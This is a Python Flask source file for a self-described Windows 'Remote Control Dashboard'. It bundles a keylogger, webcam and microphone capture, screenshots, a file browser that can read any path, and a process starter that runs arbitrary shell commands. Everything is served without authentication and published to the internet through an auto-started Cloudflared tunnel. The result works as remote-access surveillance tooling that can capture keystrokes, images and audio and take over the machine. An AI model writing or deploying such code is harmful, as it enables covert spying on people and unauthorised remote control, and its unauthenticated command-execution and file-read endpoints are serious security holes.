# app.py  – Remote Control Dashboard v3 + Cloudflared
# -------------------------------------------------------------------------
"""
Adds full feature set:
- Keylogger (start/stop + fetch logs)
- Webcam snapshot (JPEG)
- Microphone capture (WAV)
- Live CPU/RAM graphs via Chart.js
- Disk usage overview
- Process manager (list / kill / start)
- File browser (list, download, upload)
- Power actions incl. sleep & hibernate
- Brightness and volume get/set
- 🔥 NEW: Auto-start Cloudflared tunnel & print public URL 🔥

***Run as Administrator*** for low-level control.

Dependencies:
    pip install flask psutil pillow pynput opencv-python sounddevice soundfile \
                GPUtil wmi pycaw comtypes requests werkzeug
    # plus the cloudflared binary in PATH (or same folder)
Then:
    python app.py
"""

from __future__ import annotations
import io, ctypes, subprocess, re, threading, json, os, socket, platform, requests
import shutil, uuid, tempfile, time
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, List

from flask import Flask, jsonify, Response, request, send_file, abort
import psutil
from PIL import ImageGrab
from werkzeug.utils import secure_filename
try:
    from pynput import keyboard
except ImportError:
    keyboard = None
try:
    import cv2
except ImportError:
    cv2 = None
try:
    import sounddevice as sd, soundfile as sf
except ImportError:
    sd = sf = None
try:
    import GPUtil
except ImportError:
    GPUtil = None
try:
    import wmi  # brightness
except ImportError:
    wmi = None
try:
    from ctypes import POINTER, cast
    from comtypes import CLSCTX_ALL
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
except ImportError:
    AudioUtilities = IAudioEndpointVolume = None  # type: ignore

app = Flask(__name__)
UPLOAD_DIR = Path(tempfile.gettempdir()) / "remote_uploads"
UPLOAD_DIR.mkdir(exist_ok=True)

###############################################################################
# 🔗 Cloudflared helper
###############################################################################

def start_cloudflared(port: int = 5000) -> tuple[subprocess.Popen | None, str | None]:
    """
    Starts a Cloudflared tunnel to localhost:<port>.
    Returns (process, public_url) – url is None on failure.
    """
    cld_bin = shutil.which("cloudflared") or shutil.which("cloudflared.exe")
    if not cld_bin:
        print("[!] cloudflared binary not found. Grab it from https://github.com/cloudflare/cloudflared/releases")
        return None, None

    cmd = [cld_bin, "tunnel", "--url", f"http://localhost:{port}"]
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

    public_url = None
    for line in proc.stdout:
        # Look for the first generated URL
        m = re.search(r"https://[-\w]+\.trycloudflare\.com", line)
        if m:
            public_url = m.group(0)
            break
    return proc, public_url

###############################################################################
# Helper functions (unchanged)
###############################################################################

def ping_time(host: str = "8.8.8.8") -> int | None:
    try:
        out = subprocess.check_output(["ping", "-n", "1", host], text=True, timeout=5)
        m = re.search(r"Average = ([0-9]+)ms", out)
        return int(m.group(1)) if m else None
    except Exception:
        return None

def internet_up() -> bool:
    return ping_time() is not None

def is_locked() -> bool:
    user32 = ctypes.WinDLL("user32", use_last_error=True)
    DESKTOP_SWITCHDESKTOP = 0x0100
    hdesk = user32.OpenDesktopW("Default", 0, False, DESKTOP_SWITCHDESKTOP)
    if not hdesk:
        return False
    res = user32.SwitchDesktop(hdesk)
    user32.CloseDesktop(hdesk)
    return not bool(res)

def gpu_temp() -> int | None:
    if not GPUtil:
        return None
    try:
        gpus = GPUtil.getGPUs()
        return gpus[0].temperature if gpus else None
    except Exception:
        return None

def local_ips() -> Dict[str, str]:
    ips: Dict[str, str] = {}
    for iface, addrs in psutil.net_if_addrs().items():
        for a in addrs:
            if a.family == socket.AddressFamily.AF_INET and not a.address.startswith("127."):
                ips[iface] = a.address
    return ips

def public_ip(timeout: float = 3.0) -> str | None:
    try:
        return requests.get("https://api.ipify.org", timeout=timeout).text.strip()
    except Exception:
        return None

def specs() -> Dict[str, Any]:
    out: Dict[str, Any] = {
        "cpu": platform.processor() or platform.machine(),
        "ram_gb": round(psutil.virtual_memory().total / (1024 ** 3), 1),
        "os": f"{platform.system()} {platform.release()} (build {platform.version()})",
    }
    if wmi:
        try:
            cs = wmi.WMI().Win32_ComputerSystem()[0]
            out["manufacturer"] = cs.Manufacturer
            out["model"] = cs.Model
        except Exception:
            pass
    if GPUtil:
        try:
            gpus = GPUtil.getGPUs()
            if gpus:
                out["gpu"] = gpus[0].name
        except Exception:
            pass
    return out

###############################################################################
# Keylogger (unchanged)
###############################################################################
_keybuf: List[str] = []
_key_running = False
_klistener = None  # type: ignore
_lock = threading.Lock()

def _on_press(k):
    with _lock:
        _keybuf.append(f"{datetime.now():%Y-%m-%d %H:%M:%S}\t{k}")

def keylog_start():
    global _klistener, _key_running
    if keyboard is None or _key_running:
        return
    _klistener = keyboard.Listener(on_press=_on_press)
    _klistener.start()
    _key_running = True

def keylog_stop():
    global _klistener, _key_running
    if _klistener:
        _klistener.stop()
    _key_running = False

###############################################################################
# Brightness / Volume (unchanged)
###############################################################################

def get_brightness() -> int | None:
    if not wmi:
        return None
    try:
        return wmi.WMI(namespace="wmi").WmiMonitorBrightness()[0].CurrentBrightness
    except Exception:
        return None

def set_brightness(level: int):
    if not wmi:
        raise RuntimeError("WMI not available")
    wmi.WMI(namespace="wmi").WmiMonitorBrightnessMethods()[0].WmiSetBrightness(level, 0)

def get_volume() -> int | None:
    if not AudioUtilities:
        return None
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)  # type: ignore
    vol = cast(interface, POINTER(IAudioEndpointVolume))
    return int(vol.GetMasterVolumeLevelScalar() * 100)

def set_volume(level: int):
    if not AudioUtilities:
        raise RuntimeError("pycaw not available")
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)  # type: ignore
    vol = cast(interface, POINTER(IAudioEndpointVolume))
    vol.SetMasterVolumeLevelScalar(level / 100, None)

###############################################################################
# Process Manager (unchanged)
###############################################################################

def list_processes() -> List[Dict[str, Any]]:
    procs = []
    for p in psutil.process_iter(["pid", "name", "username", "cpu_percent", "memory_percent"]):
        try:
            procs.append(p.info)
        except psutil.NoSuchProcess:
            continue
    return procs

###############################################################################
# File Browser helper
###############################################################################

def safe_path(rel: str) -> Path:
    p = (Path("/") / rel.lstrip("/\\")).resolve()
    return p

###############################################################################
# Flask routes (unchanged)
###############################################################################

@app.route("/")
def root():
    return Response(INDEX_HTML, mimetype="text/html")

@app.route("/status")
def status():
    batt = psutil.sensors_battery()
    disks = {
        p.mountpoint: {
            "total": psutil.disk_usage(p.mountpoint).total,
            "used": psutil.disk_usage(p.mountpoint).used,
            "free": psutil.disk_usage(p.mountpoint).free,
        }
        for p in psutil.disk_partitions() if p.fstype
    }
    return jsonify(
        internet=internet_up(),
        ping=ping_time(),
        locked=is_locked(),
        cpu=psutil.cpu_percent(interval=0.1),
        ram=psutil.virtual_memory().percent,
        gpu_temp=gpu_temp(),
        battery=batt._asdict() if batt else None,
        disk=disks,
        local_ips=local_ips(),
        public_ip=public_ip(),
        specs=specs(),
    )

@app.route("/action/<cmd>", methods=["POST"])
def power(cmd):
    table = {
        "lock": ["rundll32.exe", "user32.dll,LockWorkStation"],
        "restart": ["shutdown", "/r", "/t", "0"],
        "shutdown": ["shutdown", "/s", "/t", "0"],
        "sleep": ["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"],
        "hibernate": ["shutdown", "/h"],
    }
    if cmd not in table:
        abort(400)
    subprocess.Popen(table[cmd])
    return "", 204

@app.route("/brightness", methods=["GET", "POST"])
def bright():
    if request.method == "POST":
        set_brightness(int(request.json["level"]))
    return jsonify(level=get_brightness())

@app.route("/volume", methods=["GET", "POST"])
def vol():
    if request.method == "POST":
        set_volume(int(request.json["level"]))
    return jsonify(level=get_volume())

@app.route("/screenshot")
def screenshot():
    img = ImageGrab.grab()
    b = io.BytesIO(); img.save(b, format="PNG"); b.seek(0)
    return send_file(b, mimetype="image/png")

@app.route("/webcam")
def webcam():
    if not cv2:
        abort(501)
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        cam.release()
        return abort(500)
    ret, frame = cam.read(); cam.release()
    if not ret:
        abort(500)
    _, buf = cv2.imencode(".jpg", frame)
    return send_file(io.BytesIO(buf.tobytes()), mimetype="image/jpeg")

@app.route("/mic")
def mic():
    if not sd:
        abort(501)
    dur = float(request.args.get("sec", 5))
    fs = 44100
    rec = sd.rec(int(dur*fs), samplerate=fs, channels=1); sd.wait()
    tmp = io.BytesIO(); sf.write(tmp, rec, fs, format="WAV"); tmp.seek(0)
    return send_file(tmp, mimetype="audio/wav")

@app.route("/keylogger/<cmd>", methods=["POST"])
def keylog(cmd):
    if cmd == "start":
        keylog_start()
    elif cmd == "stop":
        keylog_stop()
    else:
        abort(400)
    return "", 204

@app.route("/keylogs")
def keylogs():
    return jsonify(_keybuf[-1000:])

# --------------------- Process Manager ------------------------
@app.route("/processes")

def processes():
    return jsonify(list_processes())

@app.route("/process/<int:pid>/kill", methods=["POST"])

def kill_proc(pid):
    try:
        p = psutil.Process(pid); p.terminate()
        return "", 204
    except psutil.NoSuchProcess:
        abort(404)

@app.route("/process/start", methods=["POST"])

def start_proc():
    data = request.json
    if not data or "cmd" not in data:
        abort(400)
    try:
        subprocess.Popen(data["cmd"], shell=True, cwd=data.get("cwd", None))
        return "", 204
    except Exception as e:
        return str(e), 500

# --------------------- File Browser ---------------------------
@app.route("/files")

def listing():
    p = safe_path(request.args.get("path", ""))
    if not p.exists():
        abort(404)
    if p.is_file():
        return send_file(p)
    items = []
    for child in p.iterdir():
        items.append({
            "name": child.name,
            "is_dir": child.is_dir(),
            "size": child.stat().st_size,
            "mtime": child.stat().st_mtime,
        })
    return jsonify(path=str(p), items=items)

@app.route("/download")

def download():
    p = safe_path(request.args.get("path", ""))
    if not p.is_file():
        abort(404)
    return send_file(p, as_attachment=True)

@app.route("/upload", methods=["POST"])

def upload():
    if "file" not in request.files:
        abort(400)
    f = request.files["file"]
    fname = secure_filename(f.filename)
    dest = UPLOAD_DIR / f"{uuid.uuid4()}_{fname}"
    f.save(dest)
    return jsonify(saved=str(dest))

INDEX_HTML = r"""
<!DOCTYPE html><html lang='en'><head>
<meta charset='UTF-8'><title>Remote Dashboard</title>
<link href='https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css' rel='stylesheet'>
<script src='https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.0/chart.umd.min.js'></script>
<style>body{background:#f8f9fa}.card{margin-bottom:1rem}</style></head>
<body><div class='container py-3'>
<h1 class='mb-3'>Remote Control Dashboard</h1>
<div class='row'>
  <div class='col-lg-4'>
    <div class='card'><div class='card-header'>Status</div><div class='card-body' id='stat'></div></div>
    <div class='card'><div class='card-header'>Network & Specs</div><div class='card-body' id='net'></div></div>
    <div class='card'><div class='card-header'>Power</div><div class='card-body'>
      <button class='btn btn-sm btn-primary me-1' onclick="act('lock')">Lock</button>
      <button class='btn btn-sm btn-warning me-1' onclick="act('sleep')">Sleep</button>
      <button class='btn btn-sm btn-warning me-1' onclick="act('hibernate')">Hibernate</button>
      <button class='btn btn-sm btn-danger me-1' onclick="act('restart')">Restart</button>
      <button class='btn btn-sm btn-danger' onclick="act('shutdown')">Shutdown</button>
    </div></div>
    <div class='card'><div class='card-header'>Capture</div><div class='card-body'>
      <button class='btn btn-sm btn-secondary me-1' onclick="capture('/screenshot','imgScreen')">Screenshot</button>
      <button class='btn btn-sm btn-secondary me-1' onclick="capture('/webcam','imgCam')">Webcam</button>
      <button class='btn btn-sm btn-secondary' onclick="captureAudio()">Mic 5s</button>
      <img id='imgScreen' class='img-fluid mt-2'/>
      <img id='imgCam' class='img-fluid mt-2'/>
    </div></div>
  </div>
  <div class='col-lg-8'>
    <canvas id='cpuC' height='120'></canvas>
    <canvas id='ramC' height='120'></canvas>
    <div class='card mt-2'><div class='card-header'>Processes</div><div class='card-body'><table class='table table-sm' id='procT'></table></div></div>
  </div>
</div>
<script>
const cpuD={labels:[],datasets:[{label:'CPU %',data:[],tension:.3}]};
const ramD={labels:[],datasets:[{label:'RAM %',data:[],tension:.3}]};
const cpuChart=new Chart(document.getElementById('cpuC'),{type:'line',data:cpuD});
const ramChart=new Chart(document.getElementById('ramC'),{type:'line',data:ramD});
async function act(c){await fetch('/action/'+c,{method:'POST'})}
async function capture(url,id){const b=await fetch(url);const blob=await b.blob();document.getElementById(id).src=URL.createObjectURL(blob);} 
async function captureAudio(){const b=await fetch('/mic');const blob=await b.blob();const url=URL.createObjectURL(blob);const a=new Audio(url);a.play();}
async function loadProcs(){const r=await fetch('/processes');const p=await r.json();let html='<tr><th>PID</th><th>Name</th><th>CPU%</th><th>RAM%</th><th></th></tr>';p.slice(0,50).forEach(x=>{html+=`<tr><td>${x.pid}</td><td>${x.name}</td><td>${x.cpu_percent}</td><td>${x.memory_percent.toFixed(1)}</td><td><button class='btn btn-sm btn-danger' onclick="kill(${x.pid})">Kill</button></td></tr>`});document.getElementById('procT').innerHTML=html;}
async function kill(pid){await fetch('/process/'+pid+'/kill',{method:'POST'});loadProcs();}
async function tick(){const r=await fetch('/status');const s=await r.json();const t=new Date().toLocaleTimeString();if(cpuD.labels.length>30){cpuD.labels.shift();cpuD.datasets[0].data.shift();ramD.labels.shift();ramD.datasets[0].data.shift();}cpuD.labels.push(t);ramD.labels.push(t);cpuD.datasets[0].data.push(s.cpu);ramD.datasets[0].data.push(s.ram);cpuChart.update();ramChart.update();document.getElementById('stat').innerHTML=`<b>Internet:</b> ${s.internet} | ping ${s.ping||'n/a'} ms<br><b>Locked:</b> ${s.locked}<br><b>CPU / RAM:</b> ${s.cpu}% / ${s.ram}%<br><b>GPU Temp:</b> ${s.gpu_temp||'n/a'}°C<br><b>Battery:</b> ${s.battery? s.battery.percent+'% '+(s.battery.power_plugged?'⚡':'🔋'):'n/a'}<br><b>Disk C:</b> ${(s.disk['C:\\']?.free/1073741824).toFixed(1)} GB free`;
const ipList=Object.entries(s.local_ips).map(([i,a])=>`${i}: ${a}`).join(' | ');
const specs=`${s.specs.manufacturer||''} ${s.specs.model||''}<br>CPU: ${s.specs.cpu}<br>RAM: ${s.specs.ram_gb} GB<br>GPU: ${s.specs.gpu||'—'}<br>OS: ${s.specs.os}`;
document.getElementById('net').innerHTML=`<b>Local IPs:</b> ${ipList}<br><b>Public IP:</b> ${s.public_ip||'n/a'}<hr>${specs}`;
}
setInterval(tick,3000);setInterval(loadProcs,10000);tick();loadProcs();
</script>
</div></body></html>
"""

if __name__ == "__main__":
    # 1. Start Flask in a background thread
    threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=5000, use_reloader=False),
        daemon=True,
    ).start()

    # 2. Fire up Cloudflared
    proc, url = start_cloudflared(5000)

    if url:
        print(f"[+] Cloudflared tunnel active ➜  {url}")
    else:
        print("[-] Cloudflared: failed to obtain public URL.")

    # 3. Keep main thread alive; Ctrl-C to quit
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Ctrl-C received, shutting down…")
        if proc:
            proc.terminate()
